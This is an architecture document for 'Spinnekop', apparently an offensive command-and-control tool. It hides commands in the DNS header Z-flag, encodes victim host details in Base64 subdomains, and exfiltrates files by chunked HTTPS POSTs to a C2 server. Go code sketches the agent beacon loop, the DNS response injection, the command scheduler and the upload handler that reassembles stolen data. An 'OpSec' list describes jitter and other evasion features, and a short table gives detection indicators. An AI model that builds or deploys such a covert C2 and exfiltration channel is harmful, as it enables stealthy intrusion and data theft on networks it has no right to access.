# Spinnekop Architecture

This document describes the system architecture, components, and data flow of Spinnekop.

## Overview

Spinnekop implements a hybrid C2 channel that separates concerns across two protocols:

| Channel | Protocol | Purpose | Bandwidth |
|---------|----------|---------|-----------|
| Primary | DNS | Beaconing, command dispatch | Low (~250 bytes/query) |
| Secondary | HTTPS | Data exfiltration | High (unlimited) |

This separation provides operational advantages:

1. **Stealth**: DNS traffic is ubiquitous and often trusted
2. **Reliability**: DNS almost always traverses firewalls
3. **Flexibility**: HTTPS provides high-bandwidth when needed
4. **Detection Evasion**: Different protocols harder to correlate

## System Components

### High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              TARGET NETWORK                                  │
│                                                                             │
│    ┌──────────────┐                              ┌──────────────────┐       │
│    │    AGENT     │◄─────── Z-Commands ──────────│  LOCAL RESOLVER  │       │
│    │              │                              │                  │       │
│    │  beacon.go   │────── DNS Queries ──────────►│  (Recursive)     │       │
│    │  http.go     │                              └────────┬─────────┘       │
│    │  exfil.go    │                                       │                 │
│    └──────┬───────┘                                       │                 │
│           │                                               │                 │
│           │ HTTPS (when Z=3)                              │ DNS             │
│           │                                               │                 │
└───────────┼───────────────────────────────────────────────┼─────────────────┘
            │                                               │
            │              INTERNET                         │
            │                                               │
┌───────────▼───────────────────────────────────────────────▼─────────────────┐
│                              C2 SERVER                                       │
│                                                                             │
│    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐                │
│    │  DNS Server  │◄──►│ Z-Scheduler  │◄──►│ HTTP Server  │                │
│    │   (Port 53)  │    │              │    │  (Port 8080) │                │
│    │              │    │  Command     │    │              │                │
│    │  Wildcard    │    │  Queue       │    │  /upload     │                │
│    │  A Records   │    │              │    │  Endpoint    │                │
│    └──────────────┘    └──────────────┘    └──────────────┘                │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Agent Components

The agent runs on the target system and consists of:

#### 1. Beacon Module (`beacon.go`)

Responsible for periodic check-ins via DNS:

```go
// Simplified beacon loop
for {
    response := sendDNSQuery(c2Domain)
    zValue := extractZValue(response)

    switch zValue {
    case Z_CONTINUE:
        // Continue normal beaconing
    case Z_SLEEP:
        time.Sleep(extendedSleep)
    case Z_ENUMERATE:
        enableSubdomainEncoding()
    case Z_HTTP_MODE:
        switchToHTTPS()
    }

    time.Sleep(baseInterval + jitter())
}
```

#### 2. Subdomain Encoder (`subdomain/`)

Encodes data into DNS-safe subdomain labels:

```
Input:  "DESKTOP-ABC123\Administrator"
Output: "REVTS1RPUC1BQkMxMjNcQWRtaW5pc3RyYXRvcg.c2.example.com"
        └─────────────────────────────────────┘
                    Base64 encoded
```

Constraints:
- Max 63 characters per label (DNS limit)
- Max 253 characters total FQDN
- Only alphanumeric + hyphen allowed

#### 3. HTTP Client (`httpclient/`)

Handles HTTPS data transfer when Z=3:

```
POST /upload?agent_id=ABC123&chunk=0&total=5 HTTP/1.1
Host: c2server.com:8080
Content-Type: application/octet-stream

[Base64 encoded chunk data]
```

### Server Components

The C2 server runs three integrated services:

#### 1. DNS Server (`server/`)

Authoritative DNS server with:
- Wildcard A record support (`*.c2domain.com`)
- Z-value injection into responses
- Subdomain decoding for exfil

```go
// Response construction
response := &dns.Msg{}
response.SetReply(query)

// Inject Z-value command
response.MsgHdr.Zero = scheduler.GetNextZValue(agentID)

// Add A record answer
response.Answer = append(response.Answer, &dns.A{
    Hdr: dns.RR_Header{Name: query.Question[0].Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 300},
    A:   net.ParseIP(config.IP),
})
```

#### 2. Z-Scheduler (`zhandler/`)

Manages command queuing and dispatch:

```go
type ZScheduler struct {
    commands map[string][]ZCommand  // Per-agent command queues
    mutex    sync.RWMutex
}

func (s *ZScheduler) GetNextZValue(agentID string) uint8 {
    s.mutex.Lock()
    defer s.mutex.Unlock()

    if cmds, ok := s.commands[agentID]; ok && len(cmds) > 0 {
        cmd := cmds[0]
        s.commands[agentID] = cmds[1:]
        return cmd.ZValue
    }
    return Z_CONTINUE  // Default: continue beaconing
}
```

#### 3. HTTP Handler (`httphandler/`)

Receives exfiltrated data:

```go
func uploadHandler(w http.ResponseWriter, r *http.Request) {
    agentID := r.URL.Query().Get("agent_id")
    chunk := r.URL.Query().Get("chunk")
    total := r.URL.Query().Get("total")

    data, _ := io.ReadAll(r.Body)
    decoded, _ := base64.StdEncoding.DecodeString(string(data))

    saveChunk(agentID, chunk, decoded)

    if allChunksReceived(agentID, total) {
        reassembleFile(agentID)
    }
}
```

## Data Flow

### Phase 1: Initial Beacon

```
AGENT                           LOCAL RESOLVER                    C2 SERVER
  │                                   │                               │
  │─── DNS Query ────────────────────►│                               │
  │    www.c2domain.com (A)           │                               │
  │                                   │─── Recursive Query ──────────►│
  │                                   │    www.c2domain.com (A)       │
  │                                   │                               │
  │                                   │◄── Response (Z=0) ────────────│
  │                                   │    IP: 1.2.3.4                │
  │◄── Response (Z=0) ────────────────│                               │
  │    IP: 1.2.3.4                    │                               │
  │                                   │                               │
  │    [Agent: Z=0, continue]         │                               │
  │    [Sleep with jitter]            │                               │
```

### Phase 2: Enumeration Command

```
AGENT                           LOCAL RESOLVER                    C2 SERVER
  │                                   │                               │
  │─── DNS Query ────────────────────►│                               │
  │    www.c2domain.com (A)           │                               │
  │                                   │─── Recursive Query ──────────►│
  │                                   │                               │
  │                                   │◄── Response (Z=2) ────────────│
  │◄── Response (Z=2) ────────────────│                               │
  │                                   │                               │
  │    [Agent: Z=2, enumerate]        │                               │
  │    [Enable subdomain encoding]    │                               │
  │                                   │                               │
  │─── DNS Query ────────────────────►│                               │
  │    REVTS1RPUC1BQk.c2domain.com    │─── Recursive Query ──────────►│
  │    (Base64: "DESKTOP-ABC...")     │                               │
  │                                   │    [Server decodes subdomain] │
  │                                   │◄── Response ──────────────────│
  │◄── Response ──────────────────────│                               │
```

### Phase 3: HTTP Escalation

```
AGENT                                                            C2 SERVER
  │                                                                   │
  │    [Received Z=3, switch to HTTP]                                 │
  │                                                                   │
  │─── HTTP GET / ───────────────────────────────────────────────────►│
  │    (Verify connectivity)                                          │
  │                                                                   │
  │◄── HTTP 200 OK ───────────────────────────────────────────────────│
  │                                                                   │
  │─── HTTP POST /upload?chunk=0&total=3 ────────────────────────────►│
  │    [Base64 chunk 1]                                               │
  │                                                                   │
  │◄── HTTP 200 OK ───────────────────────────────────────────────────│
  │                                                                   │
  │─── HTTP POST /upload?chunk=1&total=3 ────────────────────────────►│
  │    [Base64 chunk 2]                                               │
  │                                                                   │
  │◄── HTTP 200 OK ───────────────────────────────────────────────────│
  │                                                                   │
  │─── HTTP POST /upload?chunk=2&total=3 ────────────────────────────►│
  │    [Base64 chunk 3]                                               │
  │                                                                   │
  │◄── HTTP 200 OK ───────────────────────────────────────────────────│
  │    [Server reassembles file]                                      │
```

## Security Considerations

### OpSec Features

1. **Jittered Beaconing**: Randomized intervals prevent pattern detection
2. **Static Config Embedding**: No runtime file reads on target
3. **Wildcard DNS**: Any subdomain resolves, enabling encoding
4. **Self-Signed TLS**: HTTPS without certificate purchase
5. **Chunked Transfer**: Large files split to avoid anomalies

### Detection Surface

Despite stealth features, Spinnekop is detectable:

| Indicator | Detection Method |
|-----------|------------------|
| Non-zero Z-flag | DNS header inspection |
| High-entropy subdomains | Shannon entropy calculation |
| Periodic beaconing | Time-series analysis |
| DNS→HTTPS correlation | Multi-protocol correlation |
| Base64 in queries | Pattern matching |

See [Detection Guide](detection-guide.md) for detailed detection strategies.

## Performance Characteristics

| Metric | DNS Channel | HTTPS Channel |
|--------|-------------|---------------|
| Bandwidth | ~250 bytes/query | Unlimited |
| Latency | DNS TTL + network | Network only |
| Reliability | Very high (DNS rarely blocked) | Moderate (HTTPS may be inspected) |
| Stealth | High | Moderate |
| Use Case | Commands, small data | Large file exfil |

## Next Steps

- [Z-Value Protocol](z-value-protocol.md) - Detailed protocol specification
- [Server Guide](server-guide.md) - Setting up the C2 server
- [Agent Guide](agent-guide.md) - Building and deploying agents
